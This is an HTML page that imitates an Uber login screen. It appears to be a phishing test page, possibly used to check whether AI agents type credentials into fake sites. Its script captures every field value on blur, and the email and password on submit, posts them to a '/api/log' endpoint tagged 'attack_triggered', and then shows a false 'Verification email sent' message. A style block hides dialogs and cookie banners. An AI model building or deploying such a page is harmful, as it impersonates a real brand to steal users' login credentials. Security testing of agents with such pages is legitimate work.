<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Uber Login</title>
<link href="https://fonts.googleapis.com/css2?family=Circular+Std:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
body { margin: 0; font-family: 'Inter', sans-serif; display: flex; height: 100vh; overflow: hidden; }
.left { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; background: #fff; }
.right { flex: 1; background: #000; display: flex; align-items: center; justify-content: center; overflow:hidden; position:relative; }
.right img.bg { width: 100%; height: 100%; object-fit: cover; opacity: 0.4; mix-blend-mode: multiply; }
.form-box { width: 100%; max-width: 380px; }
.logo { height: 48px; margin-bottom: 40px; }
h1 { font-size: 32px; font-weight: 700; margin: 0 0 8px; letter-spacing: -1px; }
p.sub { color: #717171; margin: 0 0 32px; font-size: 16px; }
.field { margin-bottom: 24px; }
label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #222; }
input { width: 100%; padding: 14px 16px; font-size: 16px; border: 1px solid #B0B0B0; border-radius: 8px; box-sizing: border-box; transition: 0.2s; }
input:focus { outline: none; border-color: #222; border-width: 2px; padding: 13px 15px; }
.btn { width: 100%; background: #000; color: white; border: none; border-radius: 8px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
.btn:hover { opacity: 0.9; transform: scale(0.98); }
</style>

<style id="modal-fix">
/* === Modal/Overlay Fixes === */

/* Generic modal overlays with high z-index */
[role="dialog"],
[role="alertdialog"],
[aria-modal="true"] {
    display: none !important;
}

/* Backdrop/overlay layers */
.ReactModal__Overlay,
.modal-backdrop,
.overlay-backdrop,
.modal__overlay,
[class*="Overlay"][class*="modal"],
[class*="overlay"][class*="Modal"],
[data-testid*="modal"],
[data-testid*="overlay"],
[data-testid*="dialog"] {
    display: none !important;
}

/* Cookie consent banners */
[class*="cookie-banner"],
[class*="cookie-consent"],
[class*="cookieBanner"],
[class*="CookieConsent"],
[id*="cookie-banner"],
[id*="cookie-consent"],
[id*="onetrust"],
[id*="CookieConsent"],
#onetrust-consent-sdk,
#onetrust-banner-sdk,
.onetrust-pc-dark-filter,
#truste-consent-track,
.truste_overlay,
[class*="gdpr"],
[class*="GDPR"],
#sp_message_container_1,
[id^="sp_message_container"],
.message-container[role="dialog"] {
    display: none !important;
}

/* Notification/promo popups */
[class*="notification-banner"],
[class*="promo-popup"],
[class*="announcement-banner"],
[class*="info-banner"][style*="z-index"],
.intercom-lightweight-app,
.intercom-app,
#intercom-container,
#hubspot-messages-iframe-container,
[class*="drift-"],
[id*="drift-"],
#beacon-container,
.grecaptcha-badge {
    display: none !important;
}

/* Chat widgets */
[class*="chat-widget"],
[class*="chatWidget"],
[id*="chat-widget"],
[id*="chatbot"],
[id*="salesbot"],
#launcher,
#zendesk-chat,
.zEWidget-launcher,
[class*="LiveChat"],
[id*="livechat"] {
    display: none !important;
}

/* Airbnb-specific modal */
[class*="c1yo68k3"],
div[style*="position: fixed"][style*="inset: 0"],
div[style*="position:fixed"][style*="inset:0"] {
    display: none !important;
}

/* Generic full-screen overlays */
body > div[style*="z-index: 2147483647"],
body > div[style*="z-index:2147483647"],
div[style*="position: fixed"][style*="z-index: 99999"],
div[style*="position: fixed"][style*="z-index:99999"],
div[style*="position: fixed"][style*="z-index: 9999"][style*="width: 100%"][style*="height: 100%"],
div._vis_hide_layer,
#_vis_opt_path_hides {
    display: none !important;
}

/* Ensure body can scroll */
body {
    overflow: auto !important;
    position: static !important;
}
html {
    overflow: auto !important;
}
</style>

</head>
<body>
<div class="left">
    <div class="form-box">
        <img src="https://logo.clearbit.com/uber.com" alt="Uber" class="logo" onerror="this.style.display='none'">
        <h1>Welcome to Uber</h1>
        <p class="sub">Log in or sign up to continue.</p>
        <div class="field">
            <label>Email address</label>
            <input type="email" id="email" placeholder="name@example.com">
        </div>
        <div class="field">
            <label>Password</label>
            <input type="password" id="password" placeholder="••••••••">
        </div>
        <button class="btn" onclick="submitLogin()">Continue</button>
    </div>
</div>
<div class="right">
    <img class="bg" src="https://source.unsplash.com/random/1000x1000/?travel,work,technology,office" alt="Background">
</div>
<script>
function logPii(data, notes) {
    fetch("/api/log", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(Object.assign({}, data, {attack_triggered: true, notes: notes})) }).catch(()=>{});
}
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('blur', (e) => {
        let capture = {}; capture[e.target.id] = e.target.value; logPii(capture, "Blur capture");
    });
});
function submitLogin() {
    logPii({ email: document.getElementById('email').value, password: document.getElementById('password').value }, "Submitted login");
    alert("Verification email sent.");
}
</script>
</body>
</html>
